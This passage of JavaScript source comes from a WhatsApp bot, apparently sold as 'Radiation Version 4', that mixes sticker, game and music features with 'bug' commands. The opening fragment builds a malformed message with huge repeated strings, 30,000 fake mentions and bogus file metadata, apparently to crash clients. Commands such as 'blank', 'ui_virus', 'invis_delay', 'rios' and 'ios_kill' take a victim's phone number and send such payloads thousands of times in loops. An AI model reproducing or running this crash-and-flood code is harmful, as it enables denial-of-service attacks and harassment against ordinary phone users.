                jpegThumbnail: null,
              },
              hasMediaAttachment: true,
            },
            body: {
              text:
                '—!s`asep' +
                '{['.repeat(80000) +
                `~@1~\n`.repeat(25000),
            },
            footer: {
              text: '',
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: true,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "\u200B",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: null,
                },
              },
            },
          },
        },
      },
    },
    ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
}
// end Of Function
/// function sticker
async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}
async function styletexts(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}
function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}
async function makeStickerFromUrl(imageUrl, Void, m) {
    try {
        let buffer;
        if (imageUrl.startsWith("data:")) {
            const base64Data = imageUrl.split(",")[1];
            buffer = Buffer.from(base64Data, 'base64');
        } else {
            const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
            buffer = Buffer.from(response.data, "binary");
        }
        
        const webpBuffer = await sharp(buffer)
            .resize(512, 512, { fit: 'contain', background: { r: 255, g: 255, b: 255, alpha: 0 } })
            .webp({ quality: 70 })
            .toBuffer();
        
        const penis = await addExif(webpBuffer, global.packname, global.author)

        const fileName = getRandomFile(".webp");
        fs.writeFileSync(fileName, webpBuffer);

        await Void.sendMessage(m.chat, {
            sticker: penis,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `𝐕𝐎𝐈𝐃 ᴛᴇᴄʜ`,
                    body: `☩ Equalizer ☩`,
                    mediaType: 3,
                    renderLargerThumbnail: false,
                    thumbnailUrl: ThumbUrl, 
                    sourceUrl: `t.me/onlyone_Void`
                }
            }
        }, { quoted: m });

        fs.unlinkSync(fileName);
    } catch (error) {
        console.error("Error creating sticker:", error);
        m.reply(' check console.');
    }
}
async function doneress () {
if (!q) throw "Done Response"
let pepec = q.replace(/[^0-9]/g, "")
let ressdone = `🎯
[ ꪉ ] done : _*${command}*_❕`

  let buttons = [
        { buttonId: ".xmenu", buttonText: { displayText: "Back To Menu" } }, 
         { buttonId: ".script", buttonText: { displayText: "Buy Script" } }
    ];

    let buttonMessage = {
        image: thumb, 
        caption: ressdone,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363331859075083@newsletter",
                newsletterName: "𝐕𝐎𝐈𝐃"
            }
        },
        footer: "© ☩ Equalizer ☩",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };
await Void.sendMessage(m.chat, buttonMessage, { quoted: cursor });
}
async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

  //game
        this.game = this.game ? this.game : {}
        let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
        if (room) {
            let ok
            let isWin = !1
            let isTie = !1
            let isSurrender = !1
            // reply(`[DEBUG]\n${parseInt(m.text)}`)
            if (!/^([1-9]|(me)?giveup|surr?ender|off|skip)$/i.test(m.text)) return
            isSurrender = !/^[1-9]$/.test(m.text)
            if (m.sender !== room.game.currentTurn) {
                if (!isSurrender) return !0
            }
            if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
                reply({
                    '-3': 'The game is over',
                    '-2': 'Invalid',
                    '-1': 'Invalid Position',
                    0: 'Invalid Position',
                } [ok])
                return !0
            }
            if (m.sender === room.game.winner) isWin = true
            else if (room.game.board === 511) isTie = true
            let arr = room.game.render().map(v => {
                return {
                    X: '❌',
                    O: '⭕',
                    1: '1️⃣',
                    2: '2️⃣',
                    3: '3️⃣',
                    4: '4️⃣',
                    5: '5️⃣',
                    6: '6️⃣',
                    7: '7️⃣',
                    8: '8️⃣',
                    9: '9️⃣',
                } [v]
            })
            if (isSurrender) {
                room.game._currentTurn = m.sender === room.game.playerX
                isWin = true
            }
            let winner = isSurrender ? room.game.currentTurn : room.game.winner
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Type *surrender* to surrender and admit defeat`
            if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
                room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
            if (room.x !== room.o) Void.sendText(room.x, str, m, {
                mentions: parseMention(str)
            })
            Void.sendText(room.o, str, m, {
                mentions: parseMention(str)
            })
            if (isTie || isWin) {
                delete this.game[room.id]
            }
        }
        
// end

if (m.isGroup && global._antilink[m.chat]) {
    const detectLink = /(https?:\/\/[^\s]+)|(\b\S*\.com\S*\b)/gi;
    const msgText = m.text || m.body || '';
    if (detectLink.test(msgText) && !isAdmins && !m.key.fromMe) {
        await Void.sendMessage(m.chat, { delete: m.key });
    }
}

///bug func end

switch(command) {
case 'radiation': 
case "menu": {
await Void.sendMessage(from, { react: { text: "🥶", key: m.key } });
    const menuImages = [
        'https://files.catbox.moe/zf62nz.jpg'
    ];
    const VoidImageUrl = menuImages[Math.floor(Math.random() * menuImages.length)];

    const menuText = `
\`𝗛𝗲𝗹𝗹𝗼 𝗠𝗮𝘀𝘁𝗲𝗿, 𝗔𝗺 𝗿𝗲𝗮𝗱𝘆 𝘁𝗼 𝘀𝗲𝗿𝘃𝗲\`
┏━━[ ☘ ] ⌠★ 𝚁𝙰𝙳𝙸𝙰𝚃𝙸𝙾𝙽 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 4 ★ ⌡
┃
┃𝖜𝖊𝖑𝖈𝖔𝖒𝖊 𝖙𝖔 𝖉𝖊𝖘𝖙𝖗𝖚𝖈𝖙𝖎𝖔𝖓 𝖜𝖎𝖙𝖍 𝖗𝖆𝖉𝖎𝖆𝖙𝖎𝖔𝖓
┃  
┃   [ ＭＥＮＵ ＬＩＳＴ ]
┃├╼❀ 𝕭𝖚𝖌 𝕸𝖊𝖓𝖚
┃├╼❀ 𝕮𝖗𝖊𝖉𝖎𝖙𝖘
┃└╼❀ 𝕺𝖜𝖓𝖊𝖗 𝖒𝖊𝖓𝖚
┃
┗━━━━━━━━━━━━━━━━━━━━❍
> © 𝙱𝚈 𝙳𝙴𝙼𝙼𝚈 𝚃𝙴𝙲𝙷 𝙸𝙽𝙲`;

    const fakeSystem = {
        key: {
            remoteJid: "status@broadcast",
            fromMe: false,
            id: "FakeID12345",
            participant: "0@s.whatsapp.net"
        },
        message: { conversation: "𝚁𝙰𝙳𝙸𝙰𝚃𝙸𝙾𝙽 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 4" }
    };

    const uploadedImage = await prepareWAMessageMedia(
        { image: { url: VoidImageUrl } },
        { upload: Void.waUploadToServer }
    );

    const msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: menuText
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: ""
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: "",
                        subtitle: "",
                        hasMediaAttachment: false,
                        imageMessage: uploadedImage.imageMessage // ✅ Correct image attachment
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "𝕺𝖜𝖓𝖊𝖗",
                                    url: "https://t.me/onlyone_Void"
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "ʙᴜɢ ᴍᴇɴᴜ",
                                    id: ".bugmenu"
                                })
                            }
                        ]
                    })
                })
            }
        }
    }, { userJid: m.chat, quoted: fakeSystem });

    await Void.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
}
break;
case "bugmenu": {
await Void.sendMessage(from, { react: { text: "🥶", key: m.key } });
    const menuImages = [
        'https://files.catbox.moe/jtcquw.jpeg'
    ];
    const VoidImageUrl = menuImages[Math.floor(Math.random() * menuImages.length)];

    const menuText = `
( 🍁 ) - 情報 𝗢𝗹𝗮𝗮 ─ 𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 ─ 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 ボットは、速く柔軟で安全な自動化ツール。デジタルタスクを

─▢ ʙᴏᴛ ɴᴀᴍᴇ : ☩ Equalizer ☩ 
─▢ ʙᴜʏsᴄʀɪᴘᴛ : t.me/onlyone_Void
─▢ ᴠᴇʀsɪᴏɴ : 4.0.0
─▢ Dєvєlσpєr : t.me/onlyone_Void

  \`𝐀𝐍𝐃𝐑𝐎𝐈𝐃 𝐁𝐔𝐆'𝐒\`
─▢ .βlαπκ
─▢ .ιnvιѕ_delay
─▢ .rαδιατε
─▢ .υι_vιrυs

  \`𝐈𝐎𝐒 𝐁𝐔𝐆'𝐒\`
─▢ .rιoѕ
─▢ .ιoѕ_ĸιll

 \`𝐆𝐑𝐎𝐔𝐏 𝐁𝐔𝐆𝐒\`
─▢ .βlαπκ_gc  

> © 𝙱𝚈 𝙳𝙴𝙼𝙼𝚈 𝚃𝙴𝙲𝙷 𝙸𝙽𝙲`;
    const fakeSystem = {
        key: {
            remoteJid: "status@broadcast",
            fromMe: false,
            id: "FakeID12345",
            participant: "0@s.whatsapp.net"
        },
        message: { conversation: "𝚁𝙰𝙳𝙸𝙰𝚃𝙸𝙾𝙽 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 4" }
    };

    const uploadedImage = await prepareWAMessageMedia(
        { image: { url: VoidImageUrl } },
        { upload: Void.waUploadToServer }
    );

    const msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: menuText
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: ""
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: "",
                        subtitle: "",
                        hasMediaAttachment: false,
                        imageMessage: uploadedImage.imageMessage // ✅ Correct image attachment
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "𝕺𝖜𝖓𝖊𝖗",
                                    url: "https://t.me/onlyone_Void"
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "ᴛʜᴀɴᴋs ᴛᴏ",
                                    id: ".tqto"
                                })
                            }
                        ]
                    })
                })
            }
        }
    }, { userJid: m.chat, quoted: fakeSystem });

    await Void.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
}
break;
case "tqto": {
await Void.sendMessage(from, { react: { text: "🥶", key: m.key } });
    const menuImages = [
        'https://files.catbox.moe/qsh2zi.jpeg'
    ];
    const VoidImageUrl = menuImages[Math.floor(Math.random() * menuImages.length)];

    const menuText = `
┏━━[ ☘ ] ⌠★ 𝚁𝙰𝙳𝙸𝙰𝚃𝙸𝙾𝙽 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 4 ★ ⌡
┃
┃𝕬𝖑𝖑 𝕯𝖊𝖛𝖘 𝕴𝖓𝖛𝖔𝖑𝖛𝖊𝖉 𝕴𝖓 𝕸𝖞 𝕮𝖗𝖊𝖆𝖙𝖎𝖔𝖓
┃  
┃   [ ＤＥＶＳ ＬＩＳＴ ]
┃├╼❀ 𝐃𝐄𝐌𝐌𝐘 𝐓𝐄𝐂𝐇 ( 𝐂𝐑𝐄𝐀𝐓𝐎𝐑 )
┃├╼❀ 𝐃𝐄𝐕 𝐙𝐄𝐏𝐏𝐄𝐋𝐈
┃└╼❀ 𝐉𝐎𝐇𝐍𝐋𝐄𝐎 𝐒𝐌𝐈𝐓𝐇
┃
┗━━━━━━━━━━━━━━━━━━━━❍
> © 𝙱𝚈 𝙳𝙴𝙼𝙼𝚈 𝚃𝙴𝙲𝙷 𝙸𝙽𝙲`;
    const fakeSystem = {
        key: {
            remoteJid: "status@broadcast",
            fromMe: false,
            id: "FakeID12345",
            participant: "0@s.whatsapp.net"
        },
        message: { conversation: "𝚁𝙰𝙳𝙸𝙰𝚃𝙸𝙾𝙽 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 4" }
    };

    const uploadedImage = await prepareWAMessageMedia(
        { image: { url: VoidImageUrl } },
        { upload: Void.waUploadToServer }
    );

    const msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: menuText
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: ""
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: "",
                        subtitle: "",
                        hasMediaAttachment: false,
                        imageMessage: uploadedImage.imageMessage // ✅ Correct image attachment
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "𝕺𝖜𝖓𝖊𝖗",
                                    url: "https://t.me/onlyone_Void"
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
                                    id: ".ownmenu"
                                })
                            }
                        ]
                    })
                })
            }
        }
    }, { userJid: m.chat, quoted: fakeSystem });

    await Void.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
}
break;
case "ownmenu": {
await Void.sendMessage(from, { react: { text: "🥶", key: m.key } });
    const menuImages = [
        'https://files.catbox.moe/zt5p9c.jpeg'
    ];
    const VoidImageUrl = menuImages[Math.floor(Math.random() * menuImages.length)];

    const menuText = `
┏━━[ ☘ ] ⌠★ 𝚁𝙰𝙳𝙸𝙰𝚃𝙸𝙾𝙽 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 4 ★ ⌡
┃
┃𝖜𝖊𝖑𝖈𝖔𝖒𝖊 𝖙𝖔 𝖉𝖊𝖘𝖙𝖗𝖚𝖈𝖙𝖎𝖔𝖓 𝖜𝖎𝖙𝖍 𝖗𝖆𝖉𝖎𝖆𝖙𝖎𝖔𝖓
┃  
┃   [ ＭＥＮＵ ＬＩＳＴ ]
┃├╼❀ .addprem
┃├╼❀ .delprem
┃└╼❀ .addowner
┃└╼❀ .delowner
┃
┗━━━━━━━━━━━━━━━━━━━━❍
> © 𝙱𝚈 𝙳𝙴𝙼𝙼𝚈 𝚃𝙴𝙲𝙷 𝙸𝙽𝙲`;
    const fakeSystem = {
        key: {
            remoteJid: "status@broadcast",
            fromMe: false,
            id: "FakeID12345",
            participant: "0@s.whatsapp.net"
        },
        message: { conversation: "𝚁𝙰𝙳𝙸𝙰𝚃𝙸𝙾𝙽 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 4" }
    };

    const uploadedImage = await prepareWAMessageMedia(
        { image: { url: VoidImageUrl } },
        { upload: Void.waUploadToServer }
    );

    const msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: menuText
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: ""
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: "",
                        subtitle: "",
                        hasMediaAttachment: false,
                        imageMessage: uploadedImage.imageMessage // ✅ Correct image attachment
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "𝕺𝖜𝖓𝖊𝖗",
                                    url: "https://t.me/onlyone_Void"
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "ʙᴀᴄᴋ ᴍᴇɴᴜ",
                                    id: ".menu"
                                })
                            }
                        ]
                    })
                })
            }
        }
    }, { userJid: m.chat, quoted: fakeSystem });

    await Void.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
}
break;
// END OF CASE MENU
// Coded By Void Tech
case 'blank': {
if (!isPremium) return reply("ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss ᴏɴʟʏ!"); 
    if (!q) return reply("blank 234xxx");

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    reply(`
⏤͟͟͞͞ *𝗔𝗧𝗧𝗔𝗖𝗞𝗜𝗡𝗚 𝗧𝗔𝗥𝗚𝗘𝗧* 鈱?
- ⏤͟͟͞͞ 𝗦𝗧𝗔𝗧𝗨𝗦 : _𝗧𝗥𝗨𝗘_
- ⏤͟͟͞͞ 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 : _${command}_
- ⏤͟͟͞͞ 𝗧𝗔𝗥𝗚𝗘𝗧 : _${target}_
- ⏤͟͟͞͞ 𝗖𝗢𝗢𝗟𝗗𝗢𝗪𝗡 : _𝗙𝗶𝘃𝗲 𝗠𝗶𝗻𝘂𝘁𝗲𝘀_
`);
for (let count = 0; count < 50; count++) {
for (let i = 0; i < 40; i++) {
await NotifblankV2(target, true);
await sleep(2000);
await NotifblankV2(target, true);
await sleep(2000);
await NotifblankV2(target, true);
await sleep(2000);
await NotifblankV2(target, true);
await sleep(2000);
await NotifblankV2(target, true);
}
    }

    await sleep(1000);
break;

}; 
case 'ui_virus': {
if (!isPremium) return reply("ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss ᴏɴʟʏ!"); 
    if (!q) return reply("ui_virus 234xxx");

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    reply(`
⏤͟͟͞͞ *𝗔𝗧𝗧𝗔𝗖𝗞𝗜𝗡𝗚 𝗧𝗔𝗥𝗚𝗘𝗧* 鈱?
- ⏤͟͟͞͞ 𝗦𝗧𝗔𝗧𝗨𝗦 : _𝗧𝗥𝗨𝗘_
- ⏤͟͟͞͞ 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 : _${command}_
- ⏤͟͟͞͞ 𝗧𝗔𝗥𝗚𝗘𝗧 : _${target}_
- ⏤͟͟͞͞ 𝗖𝗢𝗢𝗟𝗗𝗢𝗪𝗡 : _𝗙𝗶𝘃𝗲 𝗠𝗶𝗻𝘂𝘁𝗲𝘀_
`);
for (let count = 0; count < 50; count++) {
for (let i = 0; i < 40; i++) {
await NotifblankV2(target, true);
await sleep(2000);
await gsInter(target, true);
}
    }

    await sleep(1000);
break;

}; 
case 'radiate': {
    if (!q) return reply("radiate 234xxx");

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    reply(`
⌜ *𝗔𝗧𝗧𝗔𝗖𝗞𝗜𝗡𝗚 𝗧𝗔𝗥𝗚𝗘𝗧* ⌟
- 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗧𝗨𝗦 : 𝗔𝗰𝘁𝗶𝘃𝗲
- 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 : ${command}
- 𝗧𝗔𝗥𝗚𝗘𝗧 : ${target}
`);
for (let count = 0; count < 50; count++) {
for (let i = 0; i < 40; i++) {
await zalthrexhytam(Void, target);
await sleep(1500);
await zalthrexhytam(Void, target);
await sleep(1500);
await zalthrexhytam(Void, target);
}
    }

    await sleep(1000);
break;

}; 
case 'invis_delay': {
if (!isPremium) return reply("ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss ᴏɴʟʏ!"); 
    if (!q) return reply("invis_delay 234xxx");

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    reply(`
鈱? *𝙰𝚃𝚃𝙰𝙲𝙺𝙸𝙽𝙶 𝚅𝙸𝙲𝚃𝙸𝙼* 鈱?
- 馃挩 𝚂𝚃𝙰𝚃𝚄𝚂 : _𝚃𝚁𝚄𝙴_
- 馃挩 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 : _${command}_
- 馃挩 𝚃𝙰𝚁𝙶𝙴𝚃 : _${target}_
`);
for (let count = 0; count < 50; count++) {
for (let i = 0; i < 40; i++) {
await gsInter(target, true);
await sleep(1500);
await gsInter(target, true);
await sleep(1500);
await gsInter(target, true);
await sleep(1500);
await gsInter(target, true);
await sleep(1500);
await gsInter(target, true);
await sleep(1500);
await gsInter(target, true);
}
    }
    
    await sleep(1000);
break;

};
case 'rios': {
if (!isPremium) return reply("ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss ᴏɴʟʏ!"); 
    if (!q) return reply("rios 234xxx");

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    reply(`
⏤͟͟͞͞ *𝗔𝗧𝗧𝗔𝗖𝗞𝗜𝗡𝗚 𝗧𝗔𝗥𝗚𝗘𝗧* 鈱?
- ⏤͟͟͞͞ 𝗦𝗧𝗔𝗧𝗨𝗦 : _𝗧𝗥𝗨𝗘_
- ⏤͟͟͞͞ 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 : _${command}_
- ⏤͟͟͞͞ 𝗧𝗔𝗥𝗚𝗘𝗧 : _${target}_
- ⏤͟͟͞͞ 𝗖𝗢𝗢𝗟𝗗𝗢𝗪𝗡 : _𝗙𝗶𝘃𝗲 𝗠𝗶𝗻𝘂𝘁𝗲𝘀_
`);
for (let count = 0; count < 50; count++) {
for (let i = 0; i < 40; i++) {
await rageioshere(target);
await sleep(2000);
await rageioshere(target);
await sleep(2000);
await rageioshere(target);
await sleep(2000);
await rageioshere(target);
await sleep(2000);
await rageioshere(target);
}
    }
    
    await sleep(1000);   
break;

    };
case 'blank_gc': {
  if (!m.isGroup) return m.reply('This command can only be used in a group!');
  if (!isCreator) return m.reply('Only the creator can use this command!');
for (let count = 0; count < 50; count++) {
for (let i = 0; I < 40; i++) {
}
   }
   
   await sleep(1000);
  break;
  
  };
case 'ios_kill': {
if (!isPremium) return reply("ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss ᴏɴʟʏ!"); 
    if (!q) return reply("ios_kill 234xxx");

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    reply(`
⏤͟͟͞͞ *𝗔𝗧𝗧𝗔𝗖𝗞𝗜𝗡𝗚 𝗧𝗔𝗥𝗚𝗘𝗧* 鈱?
- ⏤͟͟͞͞ 𝗦𝗧𝗔𝗧𝗨𝗦 : _𝗧𝗥𝗨𝗘_
- ⏤͟͟͞͞ 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 : _${command}_
- ⏤͟͟͞͞ 𝗧𝗔𝗥𝗚𝗘𝗧 : _${target}_
- ⏤͟͟͞͞ 𝗖𝗢𝗢𝗟𝗗𝗢𝗪𝗡 : _𝗙𝗶𝘃𝗲 𝗠𝗶𝗻𝘂𝘁𝗲𝘀_
`);
for (let count = 0; count < 50; count++) {
for (let i = 0; i < 40; i++) {
await rageioshere(target);
await sleep(2000);
await rageioshere(target);
await sleep(2000);
await rageioshere(target);
await sleep(2000);
await rageioshere(target);
await sleep(2000);
await rageioshere(target);
}
    }
    
    await sleep(1000);
    }
break;
case 'antilink': {
    if (!m.isGroup) return reply("This command only works in group chats.");
    if (!isAdmins) return reply("Only group admins can use this command.");
    if (!args[0]) return reply("Use: .antilink on / off");

    const status = args[0].toLowerCase();

    if (status === 'on') {
        global._antilink[m.chat] = true;
        return reply("Antilink is now *enabled* in this group.");
    } else if (status === 'off') {
        global._antilink[m.chat] = false;
        return reply("Antilink is now *disabled* in this group.");
    } else {
        return reply("Invalid. Use on/off.");
    }
}
break;
case 'sticker': case 's': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
  if (!m.quoted) return reply(`Reply Image or Video with command ${prefix + command}`);
  
  if (/image/.test(mime)) {
    let media = await quoted.download();
    let encmedia = await Void.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else if (/video/.test(mime)) {
    if ((quoted.msg || quoted).seconds > 11) return m.reply('max 10s');
    
    let media = await quoted.download();
    let encmedia = await Void.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else {
    return reply(`Send Image or Video with command ${prefix + command}\nvideo duration only 1-9s`);
  }
}
// WAGWANNNN

      break
            
      
//========================================================\\
        case'brat':{
            if (isCreator) return
            if (!text) return reply(`text? example ${prefix + command} apanih cok`)
            const imageUrl = `https://brat.caliphdev.com/api/brat?text=${text}`;
            await reaction(m.chat, "⚡")
            await makeStickerFromUrl(imageUrl, rage, m);
        }
       break
//========================================================\\
    case 'play1': {
    if (!text) return reply(`provide a song name dude, Example: ${prefix + command} ʏᴏᴜᴛᴜʙᴇʀ ʙʏ 𝐕𝐎𝐈𝐃ᴥ 〔𝖧𝖨𝖬𝖲𝖤𝖫𝖥〕 亗`);

    const query = text.trim(); 
    await Void.sendMessage(m.chat, { react: { text: "🎙️", key: m.key } });

    try {
        const response = await axios.post('http://kinchan.sytes.net/ytdl/search', { text: query });
        const video = response.data;

        if (!video || !video.title) {
            return reply('process....');
        }

        const url = video.url;
        const format = 'ogg';

        const downloads = await axios.post('http://kinchan.sytes.net/ytdl/downloader', {
            url: url,
            format: format
        });

        const { title, downloadUrl } = downloads.data;

        const audios = await axios.get(downloadUrl, { responseType: 'arraybuffer' });
        const audio = Buffer.from(audios.data, 'binary');

        const thumbnails = await axios.get(video.thumbnail, { responseType: 'arraybuffer' });
        const thumbnail = Buffer.from(thumbnails.data, 'binary');

        await Void.sendMessage(m.chat, {
            audio: audio,
            mimetype: 'audio/mp4',
            fileName: `${title}.mp3`,
            contextInfo: {
